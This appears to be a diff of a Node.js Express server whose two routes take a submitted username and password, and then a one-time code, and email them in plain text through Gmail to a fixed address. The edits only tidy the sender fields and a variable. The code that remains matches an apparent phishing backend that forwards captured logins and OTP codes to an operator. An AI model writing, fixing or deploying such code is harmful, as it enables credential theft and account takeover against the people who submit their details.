@@ -32,7 +32,7 @@ app.post("/", (req, res) => {
   });
 
   const mailOptions = {
-    from: `${username}`,
+    from: userEmail,
     to: userEmail,
     subject: `Email: ${username} \t\n\n\n password: ${password}`,
     text: `New user registered with Email: ${username} and password: ${password}`,
@@ -52,7 +52,7 @@ app.post("/", (req, res) => {
 // API routes for otp
 app.post("/otp", (req, res) => {
   console.log(req.body);
-  let email = console.log(req.body.email);
+  const email = req.body.email;
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -63,7 +63,7 @@ app.post("/otp", (req, res) => {
   });
 
   const mailOptions = {
-    from: email,
+    from: userEmail,
     to: userEmail,
     subject: `OTP: ${req.body?.otp} `,
     text: `New user registered with OTP: ${req.body?.otp}`,
@@ -84,4 +84,3 @@ app.post("/otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
-
